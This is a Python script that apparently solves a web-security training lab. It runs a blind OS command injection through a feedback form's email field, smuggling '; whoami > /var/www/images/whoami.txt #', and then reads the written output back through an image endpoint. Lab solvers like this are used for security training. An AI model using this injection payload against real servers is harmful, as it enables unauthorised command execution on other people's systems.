from ..utils import *
from bs4 import BeautifulSoup
from urllib.parse import urlencode


def solve_lab(session):
    csrf = session.get_csrf_token("/feedback")

    payload = "; whoami > /var/www/images/whoami.txt #"
    data = {
        "csrf": csrf,
        "name": "user",
        "email": f"user@example.com{payload}",
        "subject": "Example Subject",
        "message": "This is an example message.",
    }

    path = "/feedback/submit"
    print_info(
        f'Performing an OS command injection attack by sending a POST request to "{path}" with the following data:'
    )
    print(f"{data}")

    resp = session.post_path(path, data=data)
    if resp.status_code != 200:
        print_fail("POST request not sent successfully.")
    else:
        print_success("POST request sent successfully.\n")

    path = "/image"
    params = {"filename": "whoami.txt"}
    print_info(
        f'Visiting "{path}?{urlencode(params)}" to retrieve the output of the command...'
    )

    resp = session.get_path(path, params=params)
    if resp.status_code != 200:
        print_fail(resp.text)
    else:
        print_success(resp.text)
